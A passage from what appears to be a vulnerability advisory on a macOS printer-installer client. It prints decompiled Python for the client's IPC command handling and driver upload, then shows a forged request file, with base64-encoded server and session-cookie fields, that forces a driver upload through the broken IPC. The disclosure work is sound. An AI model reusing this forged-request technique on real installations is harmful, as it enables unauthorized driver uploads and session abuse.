  File "printer_installer/client/service/process/command.py", line 52, in handle
  File "/usr/local/python3.6/lib/python3.6/traceback.py", line 169, in print_last
ValueError: no last exception
user@laptop service_interface %
</code></pre>
<p>The entire security model of inter-process communication is broken.</p>
<p><a id="mac-potential-drivers-upload"></a></p>
<h2>Details - Potential upload of new drivers</h2>
<p>After reading some Python code found in the solution, the names of tasks used in APIs were identified.</p>
<p>The Python bytecode was converted back to Python using <a href="https://github.com/rocky/python-uncompyle6">Uncompyle6</a>.</p>
<p>Identification of tasks used in APIs:</p>
<pre><code>kali% pwd
/home/user/laptop-mac/files-opt/PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/process/task
kali% grep request_name *.py | grep =
acquire_active_oauth_token.pyc.py:    request_name = 'ACQUIRE_ACTIVE_OAUTH_TOKEN'
bundle_debug.pyc.py:    request_name = 'BUNDLE_DEBUG'
default.pyc.py:    request_name = 'DEFAULT'
edit_profile.pyc.py:    request_name = 'EDIT_PROFILE'
get_context_menu_items.pyc.py:    request_name = 'GET_CONTEXT_MENU_ITEMS'
get_security_info.pyc.py:    request_name = 'GET_SECURITY_INFO'
get_security_info.pyc.py:        use_ui = self.context.origin != constants.internal_request_name
get_security_info.pyc.py:            logging.error((error.format(self.request_name)), exc_info=True)
idp_direct_login.pyc.py:    request_name = 'IDP_DIRECT_LOGIN'
idp_direct_login.pyc.py:        if self.context._origin == self.context.constants.interface_request_name:
install_printer.pyc.py:    request_name = 'INSTALL_PRINTER'
logout_idp_user.pyc.py:    request_name = 'LOGOUT_IDP_USER'
logout_idp_user.pyc.py:        if self.context._origin == self.context.constants.interface_request_name:
open_home_url.pyc.py:    request_name = 'OPEN_HOME_URL'
open_print_job_management.pyc.py:    request_name = 'OPEN_PRINT_JOB_MANAGEMENT'
query_ip.pyc.py:    request_name = 'QUERY_IP'
record_print_job.pyc.py:    request_name = 'RECORD_PRINT_JOB'
refresh.pyc.py:    request_name = 'REFRESH'
replace_driver.pyc.py:    request_name = 'REPLACE_DRIVER'
send_gui_message.pyc.py:    request_name = 'SEND_GUI_MESSAGE'
show_idp_authentication_app.pyc.py:    request_name = 'SHOW_IDP_AUTHENTICATION_APP'
show_idp_authentication_app.pyc.py:            if self.context._origin == self.context.constants.interface_request_name:
show_secure_release_prompt.pyc.py:    request_name = 'SHOW_SECURE_RELEASE_PROMPT'
show_secure_release_settings.pyc.py:    request_name = 'SHOW_SECURE_RELEASE_SETTINGS'
task_by_name.pyc.py:task_by_name = {AcquireActiveOauthToken.request_name: AcquireActiveOauthToken,
task.pyc.py:    request_name = None
task.pyc.py:        data = cls.request_name.encode('utf-8') + b'\n'
toggle_debug_mode.pyc.py:    request_name = 'TOGGLE_DEBUG_MODE'
update_print_job_state.py:    request_name = 'UPDATE_PRINT_JOB_STATE'
update_print_job_state.pyc.py:    request_name = 'UPDATE_PRINT_JOB_STATE'
upload_driver.pyc.py:    request_name = 'UPLOAD_DRIVER'
use_authorization_code.pyc.py:    request_name = 'USE_AUTHORIZATION_CODE'
</code></pre>
<p>Other tasks were identified in <code>PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/process/command.py</code> (extracted from <code>PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/process/command.pyc</code> using uncompyle6):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">326</span>     <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;IS_CLIENT_READY&#39;</span>: <span style="color: #408080; font-style: italic"># [1] command IS_CLIENT_READY</span>
<span style="color: #666666">327</span>         response <span style="color: #666666">=</span> _DummyResponse(<span style="color: #008000">True</span>, _BROWSER_INTERFACE_VERSION)
<span style="color: #666666">328</span>     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">329</span>         <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;SET_CONFIGURATION&#39;</span>: <span style="color: #408080; font-style: italic"># [2] command SET_CONFIGURATION</span>
<span style="color: #666666">330</span> 
<span style="color: #666666">331</span>             <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">_Task</span>(task<span style="color: #666666">.</span>Task):
<span style="color: #666666">332</span>                 request_name <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;SET_CONFIGURATION&#39;</span> <span style="color: #408080; font-style: italic"># [3] command SET_CONFIGURATION</span>
<span style="color: #666666">333</span> 
<span style="color: #666666">334</span>                 <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_call</span>(<span style="color: #008000">self</span>):
<span style="color: #666666">335</span>                     <span style="color: #008000; font-weight: bold">pass</span>
<span style="color: #666666">336</span> 
<span style="color: #666666">337</span>             arguments <span style="color: #666666">=</span> get_configuration_parameters()
<span style="color: #666666">338</span>             response <span style="color: #666666">=</span> (_Task<span style="color: #666666">.</span>generate_internal_request)(context, <span style="color: #666666">*</span>arguments, <span style="color: #666666">**</span>{<span style="color: #BA2121">&#39;request_id&#39;</span>: request_id})
<span style="color: #666666">339</span>         <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">340</span>             <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;QUERY_IP&#39;</span>: <span style="color: #408080; font-style: italic"># [4] command QUERY_IP</span>
<span style="color: #666666">341</span>                 response <span style="color: #666666">=</span> query_ip<span style="color: #666666">.</span>QueryIp<span style="color: #666666">.</span>generate_internal_request(context, request_id<span style="color: #666666">=</span>request_id)
<span style="color: #666666">342</span>             <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">343</span>                 <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;ACQUIRE_ACTIVE_OAUTH_TOKEN&#39;</span>: <span style="color: #408080; font-style: italic"># [5] command ACQUIRE_ACTIVE_OAUTH_TOKEN</span>
<span style="color: #666666">344</span>                     arguments <span style="color: #666666">=</span> get_configuration_parameters()
<span style="color: #666666">345</span>                     response <span style="color: #666666">=</span> (acquire_active_oauth_token<span style="color: #666666">.</span>AcquireActiveOauthToken<span style="color: #666666">.</span>generate_internal_request)(
<span style="color: #666666">346</span>  context, <span style="color: #666666">*</span>arguments, <span style="color: #666666">**</span>{<span style="color: #BA2121">&#39;request_id&#39;</span>: request_id})
<span style="color: #666666">347</span>                 <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">348</span>                     <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;GET_SECURITY_INFO&#39;</span>: [<span style="color: #666666">6</span>] command GET_SECURITY_INFO
<span style="color: #666666">349</span>                         arguments <span style="color: #666666">=</span> get_configuration_parameters()
<span style="color: #666666">350</span>                         response <span style="color: #666666">=</span> (get_security_info<span style="color: #666666">.</span>GetSecurityInfo<span style="color: #666666">.</span>generate_internal_request)(
<span style="color: #666666">351</span>  context, <span style="color: #666666">*</span>arguments, <span style="color: #666666">**</span>{<span style="color: #BA2121">&#39;request_id&#39;</span>: request_id})
<span style="color: #666666">352</span>                     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">353</span>                         <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;INSTALL_PRINTER&#39;</span>: [<span style="color: #666666">7</span>] command INSTALL_PRINTER
<span style="color: #666666">354</span>                             protocol, hostname, abs_url, session_id, set_id, account_id <span style="color: #666666">=</span> get_configuration_parameters()
<span style="color: #666666">355</span>                             ptype <span style="color: #666666">=</span> parameters[<span style="color: #BA2121">&#39;ptype&#39;</span>]
<span style="color: #666666">356</span>                             pid <span style="color: #666666">=</span> parameters[<span style="color: #BA2121">&#39;pid&#39;</span>]
<span style="color: #666666">357</span>                             arguments <span style="color: #666666">=</span> [protocol, hostname, abs_url, session_id, ptype, pid, set_id, account_id]
<span style="color: #666666">358</span>                             response <span style="color: #666666">=</span> (install_printer<span style="color: #666666">.</span>InstallPrinter<span style="color: #666666">.</span>generate_internal_request)(context, <span style="color: #666666">*</span>arguments, <span style="color: #666666">**</span>{<span style="color: #BA2121">&#39;request_id&#39;</span>: request_id})
<span style="color: #666666">359</span>                         <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">360</span>                             <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;UPLOAD_DRIVER&#39;</span>: <span style="color: #408080; font-style: italic"># [8] command UPLOAD_DRIVER</span>
<span style="color: #666666">361</span>                                 arguments <span style="color: #666666">=</span> get_configuration_parameters()
<span style="color: #666666">362</span>                                 response <span style="color: #666666">=</span> (upload_driver<span style="color: #666666">.</span>UploadDriver<span style="color: #666666">.</span>generate_internal_request)(context, <span style="color: #666666">*</span>arguments, <span style="color: #666666">**</span>{<span style="color: #BA2121">&#39;request_id&#39;</span>: request_id})
<span style="color: #666666">363</span>                             <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">364</span>                                 <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;REPLACE_DRIVER&#39;</span>: <span style="color: #408080; font-style: italic"># [9] command REPLACE_DRIVER</span>
<span style="color: #666666">365</span>                                     protocol, hostname, abs_url, session_id, set_id, account_id <span style="color: #666666">=</span> get_configuration_parameters()
<span style="color: #666666">366</span>                                     driver_id <span style="color: #666666">=</span> parameters[<span style="color: #BA2121">&#39;driverId&#39;</span>]
<span style="color: #666666">367</span>                                     model_title <span style="color: #666666">=</span> parameters[<span style="color: #BA2121">&#39;modelTitle&#39;</span>]
<span style="color: #666666">368</span>                                     arguments <span style="color: #666666">=</span> [protocol, hostname, abs_url, session_id, driver_id, model_title, set_id, account_id]
<span style="color: #666666">369</span>                                     response <span style="color: #666666">=</span> (replace_driver<span style="color: #666666">.</span>ReplaceDriver<span style="color: #666666">.</span>generate_internal_request)(context, <span style="color: #666666">*</span>arguments, <span style="color: #666666">**</span>{<span style="color: #BA2121">&#39;request_id&#39;</span>: request_id})
<span style="color: #666666">370</span>                                 <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">371</span>                                     <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #AA22FF; font-weight: bold">in</span> (<span style="color: #BA2121">&#39;CREATE_PROFILE&#39;</span>, <span style="color: #BA2121">&#39;EDIT_PROFILE&#39;</span>): <span style="color: #408080; font-style: italic"># [10] commands CREATE_PROFILE &amp;&amp; EDIT_PROFILE</span>
<span style="color: #666666">372</span>                                         protocol, hostname, abs_url, session_id, set_id, account_id <span style="color: #666666">=</span> get_configuration_parameters()
<span style="color: #666666">373</span>                                         driver_id <span style="color: #666666">=</span> parameters[<span style="color: #BA2121">&#39;driverId&#39;</span>]
<span style="color: #666666">374</span>                                         profile_id <span style="color: #666666">=</span> parameters<span style="color: #666666">.</span>get(<span style="color: #BA2121">&#39;profileId&#39;</span>, <span style="color: #BA2121">&#39;-1&#39;</span>)
<span style="color: #666666">375</span>                                         upload_id <span style="color: #666666">=</span> parameters<span style="color: #666666">.</span>get(<span style="color: #BA2121">&#39;uploadId&#39;</span>, <span style="color: #BA2121">&#39;-1&#39;</span>)
<span style="color: #666666">376</span>                                         arguments <span style="color: #666666">=</span> [protocol, hostname, abs_url, session_id, driver_id, profile_id, upload_id, set_id, account_id]
<span style="color: #666666">377</span>                                         response <span style="color: #666666">=</span> (edit_profile<span style="color: #666666">.</span>EditProfile<span style="color: #666666">.</span>generate_internal_request)(context, <span style="color: #666666">*</span>arguments, <span style="color: #666666">**</span>{<span style="color: #BA2121">&#39;request_id&#39;</span>: request_id})
<span style="color: #666666">378</span>                                     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">379</span>                                         <span style="color: #008000; font-weight: bold">if</span> command <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;GET_CONTEXT_MENU_ITEMS&#39;</span>: <span style="color: #408080; font-style: italic"># [11] command GET_CONTEXT_MENU_ITEMS</span>
</pre></div>

<p>The <code>UPLOAD_DRIVER</code> task is very interesting as it is basically an implementation of uploading files to a remote server.</p>
<p>Content of <code>./PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/process/task/upload_driver.pyc.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">13</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">UploadDriver</span>(task<span style="color: #666666">.</span>Task):
 <span style="color: #666666">14</span>     request_name <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;UPLOAD_DRIVER&#39;</span>
 <span style="color: #666666">15</span>     never_execute_for_all_users <span style="color: #666666">=</span> <span style="color: #008000">True</span>
 <span style="color: #666666">16</span>     never_use_ui <span style="color: #666666">=</span> <span style="color: #008000">False</span>
 <span style="color: #666666">17</span> 
 <span style="color: #666666">18</span>     <span style="color: #AA22FF">@property</span>
 <span style="color: #666666">19</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">priority</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">20</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #666666">0.5</span>
 <span style="color: #666666">21</span> 
 <span style="color: #666666">22</span>     <span style="color: #AA22FF">@property</span>
 <span style="color: #666666">23</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">default_value</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">24</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">False</span>
 <span style="color: #666666">25</span> 
 <span style="color: #666666">26</span>     <span style="color: #AA22FF">@property</span>
 <span style="color: #666666">27</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">description</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">28</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&#39;upload driver&#39;</span>
 <span style="color: #666666">29</span> 
 <span style="color: #666666">30</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">__init__</span>(<span style="color: #008000">self</span>, context, driver_id<span style="color: #666666">=</span><span style="color: #008000">None</span>):
 <span style="color: #666666">31</span>         <span style="color: #008000">super</span>()<span style="color: #666666">.</span><span style="color: #0000FF">__init__</span>(context)
 <span style="color: #666666">32</span>         <span style="color: #008000">self</span><span style="color: #666666">.</span>_driver_id <span style="color: #666666">=</span> driver_id
 <span style="color: #666666">33</span> 
 <span style="color: #666666">34</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_call</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">35</span>         logging<span style="color: #666666">.</span>debug(<span style="color: #BA2121">&#39;Getting driver paths and annotation from GUI&#39;</span>)
 <span style="color: #666666">36</span>         local_paths, annotation <span style="color: #666666">=</span> interface_upload_driver<span style="color: #666666">.</span>upload_driver(<span style="color: #008000">self</span><span style="color: #666666">.</span>context)
 <span style="color: #666666">37</span>         logging<span style="color: #666666">.</span>debug(<span style="color: #BA2121">&#39;Selected in the GUI: {}, {}&#39;</span><span style="color: #666666">.</span>format(local_paths, annotation))
 <span style="color: #666666">38</span>         <span style="color: #008000; font-weight: bold">if</span> (local_paths, annotation) <span style="color: #666666">==</span> (<span style="color: #008000">None</span>, <span style="color: #008000">None</span>):
 <span style="color: #666666">39</span>             logging<span style="color: #666666">.</span>debug(<span style="color: #BA2121">&#39;No driver to upload selected&#39;</span>)
 <span style="color: #666666">40</span>             <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #BA2121">&#39;Driver selection cancelled.&#39;</span>, <span style="color: #008000">False</span>)
 <span style="color: #666666">41</span>         <span style="color: #008000; font-weight: bold">else</span>:
 <span style="color: #666666">42</span>             logging<span style="color: #666666">.</span>debug(<span style="color: #BA2121">&#39;Uploading drivers to the database&#39;</span>)
 <span style="color: #666666">43</span>             upload_id <span style="color: #666666">=</span> server_upload_driver<span style="color: #666666">.</span>upload_driver(local_paths,
 <span style="color: #666666">44</span>               annotation,
 <span style="color: #666666">45</span>               (<span style="color: #008000">self</span><span style="color: #666666">.</span>context),
 <span style="color: #666666">46</span>               replace_driver_id<span style="color: #666666">=</span>(<span style="color: #008000">self</span><span style="color: #666666">.</span>_driver_id))
 <span style="color: #666666">47</span>             <span style="color: #008000; font-weight: bold">if</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>_driver_id <span style="color: #AA22FF; font-weight: bold">is</span> <span style="color: #AA22FF; font-weight: bold">not</span> <span style="color: #008000">None</span>:
 <span style="color: #666666">48</span>                 upload_id <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>_driver_id
 <span style="color: #666666">49</span>             current_driver_data <span style="color: #666666">=</span> driver<span style="color: #666666">.</span>create_local_driver_data(local_paths)
 <span style="color: #666666">50</span>             manufacturer <span style="color: #666666">=</span> current_driver_data<span style="color: #666666">.</span>manufacturer
 <span style="color: #666666">51</span>             model <span style="color: #666666">=</span> current_driver_data<span style="color: #666666">.</span>model
 <span style="color: #666666">52</span>             data <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;{}</span><span style="color: #BB6622; font-weight: bold">\t</span><span style="color: #BA2121">{}</span><span style="color: #BB6622; font-weight: bold">\t</span><span style="color: #BA2121">{}</span><span style="color: #BB6622; font-weight: bold">\t</span><span style="color: #BA2121">{}</span><span style="color: #BB6622; font-weight: bold">\t</span><span style="color: #BA2121">{}&#39;</span><span style="color: #666666">.</span>format(upload_id, manufacturer, model, annotation, <span style="color: #008000">self</span><span style="color: #666666">.</span>context<span style="color: #666666">.</span>os_id)
 <span style="color: #666666">53</span>             <span style="color: #008000; font-weight: bold">return</span> (data, <span style="color: #008000">True</span>)
 <span style="color: #666666">54</span> <span style="color: #408080; font-style: italic"># okay decompiling upload_driver.pyc</span>
</pre></div>

<p>The code responsible for the upload process is located at <code>./PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/connection/server/upload_driver.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">22</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_driver</span>(local_paths: <span style="color: #008000">list</span>, annotation: <span style="color: #008000">str</span>, context: Context, replace_driver_id: Optional[<span style="color: #008000">int</span>]<span style="color: #666666">=</span><span style="color: #008000">None</span>) <span style="color: #666666">-&gt;</span> <span style="color: #008000">str</span>:
 <span style="color: #666666">23</span>     local_driver_data <span style="color: #666666">=</span> driver<span style="color: #666666">.</span>create_local_driver_data(local_paths)
 <span style="color: #666666">24</span>     model <span style="color: #666666">=</span> local_driver_data<span style="color: #666666">.</span>model
 <span style="color: #666666">25</span>     title <span style="color: #666666">=</span> f<span style="color: #BA2121">&quot;Uploading driver for {local_driver_data.manufacturer} printer: {model}&quot;</span>
 <span style="color: #666666">26</span>     <span style="color: #008000; font-weight: bold">with</span> progress<span style="color: #666666">.</span>progress_or_dummy(title, PROGRESS_STEP_NAMES, context) <span style="color: #008000; font-weight: bold">as</span> (progress_callback):
 <span style="color: #666666">27</span>         <span style="color: #008000; font-weight: bold">with</span> NamedTemporaryFile(mode<span style="color: #666666">=</span><span style="color: #BA2121">&#39;w+b&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> (out_file):
 <span style="color: #666666">28</span>             driver_package_class <span style="color: #666666">=</span> driver<span style="color: #666666">.</span>get_driver_package_class()
 <span style="color: #666666">29</span>             <span style="color: #008000; font-weight: bold">with</span> driver_package_class<span style="color: #666666">.</span>get_upload_package_files(local_driver_data,
 <span style="color: #666666">30</span>               progress_callback<span style="color: #666666">=</span>progress_callback, progress_step<span style="color: #666666">=0</span>) <span style="color: #008000; font-weight: bold">as</span> (upload_package_files):
 <span style="color: #666666">31</span>                 progress_callback<span style="color: #666666">.</span>update_step(<span style="color: #666666">0</span>, <span style="color: #666666">1.0</span>)

<span style="color: #408080; font-style: italic"># [1] a tbz2 file will be created</span>
 <span style="color: #666666">32</span>                 _create_package(out_file, upload_package_files)
 <span style="color: #666666">33</span>             progress_callback<span style="color: #666666">.</span>update_step(<span style="color: #666666">1</span>, <span style="color: #666666">1.0</span>)
 <span style="color: #666666">34</span> 

<span style="color: #408080; font-style: italic"># [2] Upload of the files, class defined in ./PrinterInstallerClient/service_interface/lib/python3.6/printer_installer/client/service/connection/server/common.py.</span>
 <span style="color: #666666">35</span>             <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">UploaderCallback</span>(common<span style="color: #666666">.</span>UploaderCallback):
 <span style="color: #666666">36</span>                 driver_id <span style="color: #666666">=</span> <span style="color: #008000">None</span>
 <span style="color: #666666">37</span> 
 <span style="color: #666666">38</span>                 <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">on_size_calculated</span>(<span style="color: #008000">self</span>, total_size, total_fragments):
 <span style="color: #666666">39</span>                     progress_callback<span style="color: #666666">.</span>update_step(<span style="color: #666666">2</span>, <span style="color: #666666">1.0</span>)
 <span style="color: #666666">40</span> 
 <span style="color: #666666">41</span>                 <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">on_upload_id_obtained</span>(<span style="color: #008000">self</span>, upload_id):
 <span style="color: #666666">42</span>                     progress_callback<span style="color: #666666">.</span>update_step(<span style="color: #666666">3</span>, <span style="color: #666666">1.0</span>)
 <span style="color: #666666">43</span> 
 <span style="color: #666666">44</span>                 <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">on_fragment_uploaded</span>(<span style="color: #008000">self</span>, fragment, total_fragments):
 <span style="color: #666666">45</span>                     progress_callback<span style="color: #666666">.</span>update_step(<span style="color: #666666">4</span>, fragment <span style="color: #666666">/</span> total_fragments)
 <span style="color: #666666">46</span> 
 <span style="color: #666666">47</span>                 <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">on_complete</span>(<span style="color: #008000">self</span>, upload_id):
<span style="color: #408080; font-style: italic"># [3] Metadatas sent using _finalize_upload</span>

 <span style="color: #666666">48</span>                     <span style="color: #008000">self</span><span style="color: #666666">.</span>driver_id <span style="color: #666666">=</span> _finalize_upload(local_driver_data,
 <span style="color: #666666">49</span>                       upload_id, annotation, context, replace_driver_id<span style="color: #666666">=</span>replace_driver_id)
 <span style="color: #666666">50</span>                     progress_callback<span style="color: #666666">.</span>update_step(<span style="color: #666666">5</span>, <span style="color: #666666">1.0</span>)
 <span style="color: #666666">51</span> 
 <span style="color: #666666">52</span>             uploader_callback <span style="color: #666666">=</span> UploaderCallback()
 <span style="color: #666666">53</span>             uploader <span style="color: #666666">=</span> common<span style="color: #666666">.</span>Uploader((out_file<span style="color: #666666">.</span>name), model, context, uploader_callback<span style="color: #666666">=</span>uploader_callback)
 <span style="color: #666666">54</span>             uploader<span style="color: #666666">.</span>upload()
 <span style="color: #666666">55</span>             <span style="color: #008000; font-weight: bold">return</span> uploader_callback<span style="color: #666666">.</span>driver_id
[<span style="color: #666666">...</span>]
 <span style="color: #666666">85</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_finalize_upload</span>(local_driver_data: driver<span style="color: #666666">.</span>LocalDriverData, upload_id: <span style="color: #008000">int</span>, annotation: <span style="color: #008000">str</span>, context: Context, replace_driver_id: Optional[<span style="color: #008000">int</span>]<span style="color: #666666">=</span><span style="color: #008000">None</span>) <span style="color: #666666">-&gt;</span> <span style="color: #008000">str</span>:
 <span style="color: #666666">86</span>     params <span style="color: #666666">=</span> {<span style="color: #BA2121">&#39;confirmupload&#39;</span>:<span style="color: #666666">1</span>,
 <span style="color: #666666">87</span>      <span style="color: #BA2121">&#39;uploadid&#39;</span>:upload_id,
 <span style="color: #666666">88</span>      <span style="color: #BA2121">&#39;packagetype&#39;</span>:context<span style="color: #666666">.</span>os_driver_package_type,
 <span style="color: #666666">89</span>      <span style="color: #BA2121">&#39;oslist&#39;</span>:context<span style="color: #666666">.</span>os_id,
 <span style="color: #666666">90</span>      <span style="color: #BA2121">&#39;printprocess&#39;</span>:<span style="color: #BA2121">&#39;&#39;</span>,
 <span style="color: #666666">91</span>      <span style="color: #BA2121">&#39;driverdate&#39;</span>:local_driver_data<span style="color: #666666">.</span>date<span style="color: #666666">.</span>strftime(<span style="color: #BA2121">&#39;%m/</span><span style="color: #BB6688; font-weight: bold">%d</span><span style="color: #BA2121">/%Y&#39;</span>),
 <span style="color: #666666">92</span>      <span style="color: #BA2121">&#39;driverversion&#39;</span>:local_driver_data<span style="color: #666666">.</span>version,
 <span style="color: #666666">93</span>      <span style="color: #BA2121">&#39;make&#39;</span>:local_driver_data<span style="color: #666666">.</span>manufacturer,
 <span style="color: #666666">94</span>      <span style="color: #BA2121">&#39;modelname&#39;</span>:local_driver_data<span style="color: #666666">.</span>model,
 <span style="color: #666666">95</span>      <span style="color: #BA2121">&#39;annotation&#39;</span>:annotation,
 <span style="color: #666666">96</span>      <span style="color: #BA2121">&#39;inffile&#39;</span>:local_driver_data<span style="color: #666666">.</span>local_paths[<span style="color: #666666">0</span>]}
 <span style="color: #666666">97</span>     <span style="color: #008000; font-weight: bold">if</span> replace_driver_id <span style="color: #AA22FF; font-weight: bold">is</span> <span style="color: #AA22FF; font-weight: bold">not</span> <span style="color: #008000">None</span>:
 <span style="color: #666666">98</span>         params[<span style="color: #BA2121">&#39;existing_driver_id&#39;</span>] <span style="color: #666666">=</span> replace_driver_id
 <span style="color: #666666">99</span>     <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">100</span>         response <span style="color: #666666">=</span> common<span style="color: #666666">.</span>request_path(<span style="color: #BA2121">&#39;GET&#39;</span>, <span style="color: #BA2121">&#39;client/gateway.php&#39;</span>, context, params<span style="color: #666666">=</span>params, timeout<span style="color: #666666">=600</span>)
<span style="color: #666666">101</span>         result <span style="color: #666666">=</span> ElementTree<span style="color: #666666">.</span>fromstring(response<span style="color: #666666">.</span>text)
<span style="color: #666666">102</span>         <span style="color: #008000; font-weight: bold">if</span> result<span style="color: #666666">.</span>attrib[<span style="color: #BA2121">&#39;code&#39;</span>] <span style="color: #666666">!=</span> <span style="color: #BA2121">&#39;1&#39;</span>:
<span style="color: #666666">103</span>             description <span style="color: #666666">=</span> result<span style="color: #666666">.</span>find(<span style="color: #BA2121">&#39;./desc&#39;</span>)<span style="color: #666666">.</span>text
<span style="color: #666666">104</span>             <span style="color: #008000; font-weight: bold">raise</span> common<span style="color: #666666">.</span>ServerError(description, description)
<span style="color: #666666">105</span>         <span style="color: #008000; font-weight: bold">return</span> result<span style="color: #666666">.</span>find(<span style="color: #BA2121">&#39;./desc&#39;</span>)<span style="color: #666666">.</span>text
<span style="color: #666666">106</span>     <span style="color: #008000; font-weight: bold">except</span> exceptions<span style="color: #666666">.</span>Timeout:
<span style="color: #666666">107</span>         message <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;When trying to finalize the driver upload, the server connection timed out and was closed.  However, the driver will probably be available after the database operation is completed.&#39;</span>
<span style="color: #666666">108</span>         <span style="color: #008000; font-weight: bold">raise</span> common<span style="color: #666666">.</span>ServerError(message)
</pre></div>

<p>Trying to upload a new driver - the HTTPS request was blocked using Burp Suite Pro, so it was not sent to the remote server on [redacted].printercloud10.com (the SaaS version was out of scope during the security assessment of the macOS version).</p>
<p>By forging a custom request, it is possible to force the upload of a new driver using the API.</p>
<p>Creation of a new request inside <code>/opt/PrinterInstallerClient/tmp/requests/</code> to upload a new driver:</p>
<pre><code>user@laptop requests % cat /tmp/test.file
UPLOAD_DRIVER
aHR0cHM6
W3JlZGFjdGVkXS5wcmludGVyY2xvdWQxMC5jb20=
Lw==
UEhQU0VTU0lEPWM3Mjk2OGQ2ZTY4ZDc4MWE4MDA1Mjg3NTgwMjliMjMyO1BIUFNFU1NJRD1jNzI5NjhkNmU2OGQ3ODFhODAwNTI4NzU4MDI5YjIzMjtYU1JGLVRPS0VOPWV5SnBkaUk2SWx0eVpXUmhZM1JsWkYwaUxDSjJZV3gxWlNJNklsdHlaV1JoWTNSbFpGMGlMQ0p0WVdNaU9pSmJjbVZrWVdOMFpXUmRJbjA9O2xhcmF2ZWxfc2Vzc2lvbj1leUpwZGlJNklsdHlaV1JoWTNSbFpGMGlMQ0oyWVd4MVpTSTZJbHR5WldSaFkzUmxaRjBpTENKdFlXTWlPaUpiY21Wa1lXTjBaV1JkSW4wPTtQSFBTRVNTSUQ9YzcyOTY4ZDZlNjhkNzgxYTgwMDUyODc1ODAyOWIyMzI7WFNSRi1UT0tFTj1leUpwZGlJNklsdHlaV1JoWTNSbFpGMGlMQ0oyWVd4MVpTSTZJbHR5WldSaFkzUmxaRjBpTENKdFlXTWlPaUpiY21Wa1lXTjBaV1JkSW4wPTtsYXJhdmVsX3Nlc3Npb249ZXlKcGRpSTZJbHR5WldSaFkzUmxaRjBpTENKMllXeDFaU0k2SWx0eVpXUmhZM1JsWkYwaUxDSnRZV01pT2lKYmNtVmtZV04wWldSZEluMD07UEhQU0VTU0lEPWM3Mjk2OGQ2ZTY4ZDc4MWE4MDA1Mjg3NTgwMjliMjMyO1hTUkYtVE9LRU49ZXlKcGRpSTZJbHR5WldSaFkzUmxaRjBpTENKMllXeDFaU0k2SWx0eVpXUmhZM1JsWkYwaUxDSnRZV01pT2lKYmNtVmtZV04wWldSZEluMD07bGFyYXZlbF9zZXNzaW9uPWV5SnBkaUk2SWx0eVpXUmhZM1JsWkYwaUxDSjJZV3gxWlNJNklsdHlaV1JoWTNSbFpGMGlMQ0p0WVdNaU9pSmJjbVZrWVdOMFpXUmRJbjA9Owo=
cHJpbnRlcg==
cDk3Mg==

LTE=
